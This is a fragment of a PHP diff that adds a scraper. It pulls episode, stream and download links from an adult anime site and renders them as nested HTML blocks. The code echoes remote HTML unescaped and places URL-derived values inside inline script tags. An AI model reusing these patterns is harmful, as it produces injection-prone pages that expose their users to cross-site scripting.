+                                $final_result .= "<span style='color: lightcoral;'>Error Connecting to Server 2 times, Please check your connection or use VPN</span>\n";
+			                	return $final_result . "</div></details></details>";
+                            }
+                        }
+
+                        $mov_url = false;
+
+                        if (preg_match('/<a href="([^"]+)"[^>]*>' . $row['title'] . '<\/a>/', $initial_html, $matches)) {
+                            $movie_url = $matches[1];
+                            $mov_url = true;
+
+                        } else {
+
+                            $movie_url = strtolower(str_replace(" ", "-", str_replace('XXX', '-', preg_replace("#[[:punct:]]#", "", str_replace('-', 'XXX', $row['title'])))));
+                            $movie_url = "https://$BASEDOMAIN/hentai/$movie_url";
+                            $mov_url = true;
+                        }
+
+                        if ($mov_url) {
+
+                            try {
+                                $movie_html = $client->get($movie_url)->getBody()->getContents();
+                            } catch (Exception $e) {
+                                try {
+                                    $movie_html = $client->get($movie_url)->getBody()->getContents();
+                                } catch (Exception $e) {
+                                    $final_result .= "<span style='color: lightcoral;'>Error Getting Page from Server [$movie_url], Please check your connection or use VPN</span>";
+				                    return $final_result . "</div></details></details>";
+                                }
+                            }
+                            // echo '<script>console.log("'.$movie_html.'")</script>';
+                            $doc = new DOMDocument();
+                            @$doc->loadHTML($movie_html);
+
+                            // Create a DOMXPath object
+                            $xpath = new DOMXPath($doc);
+
+                            // XPath query to select elements with class "episodelist"
+                            $query = '//div[contains(@class, "episodelist")]';
+
+                            // Execute the query
+                            $elements = $xpath->query($query);
+
+                            // Check if elements are found
+                            if ($elements->length > 0) {
+                                // Loop through the found elements
+                                foreach ($elements as $episodelist_div) {
+                                    // Output the content of each element
+                                    // echo $doc->saveHTML($episodelist_div);
+
+                                    // Get all <a> elements within the episodelist_div
+                                    $episodes = $episodelist_div->getElementsByTagName('a');
+                                    foreach ($episodes as $episode) {
+                                        // Get the URL of the episode
+                                        $episode_url = $episode->getAttribute('href');
+                                        $batch = 'Episode';
+                                        $eps = 'EPS';
+
+                                        // Perform the regular expression match
+                                        if (preg_match('/episode-(\d+)/i', $episode_url, $episode_url_matches)) {
+                                            $counte_eps = $episode_url_matches[1];
+                                        } else {
+                                            if (preg_match('/batch/i', $episode_url, $episode_url_matches)) {
+                                                preg_match('/indonesia-(\d+)/i', $episode_url, $batch_matches);
+                                                $counte_eps = $batch_matches[1];
+                                                $batch = '[BATCH]';
+                                                $eps = '[BATCH]';
+                                            } else {
+                                                $counte_eps = "?";
+                                            }
+                                        }
+                                        // Output the episode link
+                                        if (str_contains($episode_url, 'uncensored')) {
+                                            $final_result .= "<details class='uncen'><summary>[UNCENSORED] $batch $counte_eps</summary><div style='height:10px;'></div><a target='_blank' style='text-decoration:none; color: dodgerblue;' href='$episode_url'>" . $row['title'] . " $batch $counte_eps [UNCENSORED]</a>";
+                                        } else {
+                                            $final_result .= "<details><summary>$batch $counte_eps</summary><div style='height:10px;'></div><a target='_blank' style='text-decoration:none; color: dodgerblue;' href='$episode_url'>" . $row['title'] . " $batch $counte_eps</a>";
+                                        }
+
+                                        try {
+                                            $dwnld_url = $client->get($episode_url)->getBody()->getContents();
+                                        } catch (Exception $e) {
+                                            $final_result .= "<span style='color: lightcoral;'>Error Getting Episode from Server [$episode_url], Please check your connection or use VPN</span></details></details>";
+                                            continue;
+                                        }
+
+                                        $doc_ = new DOMDocument();
+                                        @$doc_->loadHTML($dwnld_url);
+
+                                        // Create a DOMXPath object
+                                        $xpath_ = new DOMXPath($doc_);
+
+                                        $query_ = '//div[contains(@class, "boxdownload")]';
+
+                                        // Execute the query
+                                        $elements_ = $xpath_->query($query_);
+
+                                        $streams_ = $doc_->getElementById('show-stream');
+                                        $streams_html = $doc_->saveHTML($streams_);
+
+                                        $ids = str_replace("https://$BASEDOMAIN/", '', $episode_url);
+                                        $ids = str_replace('/', '', $ids);
+
+                                        $links_ids = str_replace('href="#stream', 'href="#stream-' . $ids . '-', $streams_html);
+                                        $links_ids = str_replace('id="stream', 'id="stream-' . $ids . '-', $links_ids);
+                                        $links_ids = str_replace('id="list"', "id='list-$ids'", $links_ids);
+
+                                        if (str_contains($episode_url, 'uncensored')) {
+                                            $final_result .= "<details class='uncen'><summary class='stream'>[STREAM] $eps $counte_eps</summary><div style='height:10px;'></div>" . $links_ids . "</details><script>new streamS(`$ids`).setup();</script>";
+                                            $final_result .= "<details class='uncen'><summary class='download'>[DOWNLOAD] $eps $counte_eps</summary><div style='height:10px;'></div><div class='boxdownload'>";
+                                        } else {
+                                            $final_result .= "<details><summary class='stream'>[STREAM] $eps $counte_eps</summary><div style='height:10px;'></div>" . $links_ids . "</details><script>new streamS(`$ids`).setup();</script>";
+                                            $final_result .= "<details><summary class='download'>[DOWNLOAD] $eps $counte_eps</summary><div style='height:10px;'></div><div class='boxdownload'>";
+                                        }
+
+
+
+                                        // Check if elements are found
+                                        if ($elements_->length > 0) {
+                                            // Loop through the found elements
+                                            foreach ($elements_ as $dwnld_div) {
+                                                // Output the content of each element
+                                                $dwnld_html = $doc_->saveHTML($dwnld_div);
+                                                $doc__ = new DOMDocument();
+                                                @$doc__->loadHTML($dwnld_html);
+
+                                                // Create a DOMXPath object
+                                                $xpath__ = new DOMXPath($doc__);
+
+                                                $query__ = '//div[contains(@class, "liner")]';
+
+                                                // Execute the query
+                                                $elements__ = $xpath__->query($query__);
+
+                                                // Check if elements are found
+                                                if ($elements__->length > 0) {
+                                                    // Loop through the found elements
+                                                    foreach ($elements__ as $res_div) {
+                                                        // Output the content of each element
+                                                        $html = $doc__->saveHTML($res_div);
+                                                        $uncen = false;
+
+                                                        if (str_contains($html, 'UNCENSORED')) {
+                                                            $uncen = true;
+                                                        }
+
+                                                        preg_match_all('/\[([0-9]+p)\]/', $html, $matches_);
+
+                                                        foreach ($matches_[0] as $matched_string) {
+                                                            $res = $uncen ? '[UNCENSORED] ' . $matched_string : $matched_string;
+                                                            $html = preg_replace('/<div class="name">\K.*?(?=<\/div>)/', $res, $html);
+                                                        }
+                                                        $html = preg_replace('/<b>LINK<\/b>/', '', $html);
+
+                                                        $final_result .= $html;
+                                                    }
+                                                }
+
+                                            }
+                                        }
+                                        $final_result .= '</details></details>';
+                                    }
+                                }
+
+                            } else {
+                                $final_result .= "Episodelist not found\n";
+                            }
+
+                        } else {
+                            $final_result .= "Episodelist not found\n";
+                        }
+
+
+                    } catch (Exception $e) {
+                        $final_result .= "<span style='color: lightcoral;'>Error Connecting to Server [$initial_url], Please check your connection or use VPN</span></details></details>\n";
+                    }
+
+                    $final_result .= '</div>';
+                }
+                return $final_result;
+            }
+
+
 
             ?>
         </div>
